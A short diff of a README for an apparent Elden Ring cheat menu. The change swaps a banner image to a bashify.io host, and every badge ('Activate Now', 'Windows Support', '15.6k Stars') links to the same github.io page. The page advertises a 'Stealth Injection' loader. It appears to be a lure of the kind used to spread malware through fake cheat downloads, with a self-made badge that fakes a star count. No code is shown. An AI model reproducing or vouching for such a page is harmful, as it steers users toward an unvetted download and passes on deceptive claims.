@@ -23,7 +23,7 @@ Instead of external configs, the Cheat Menu runs as an **in-game overlay UI**. W
 * 🔒 **Stealth Injection** – Lightweight loader optimized for Windows 10/11.
 
 ---
-[![Now](https://i.ibb.co/LDySf11j/Frame-1.png)](#)
+[![Now](https://bashify.io/img/5cc0617b90f940a63fe5d2e71422f918)](#)
 [![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
 [![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
 [![⭐️ 15.6k Stars](https://img.shields.io/badge/GitHub-15.6k_Stars-green?logo=github\&style=for-the-badge)](https://elden-ring-cheats-menu.github.io/.github/)
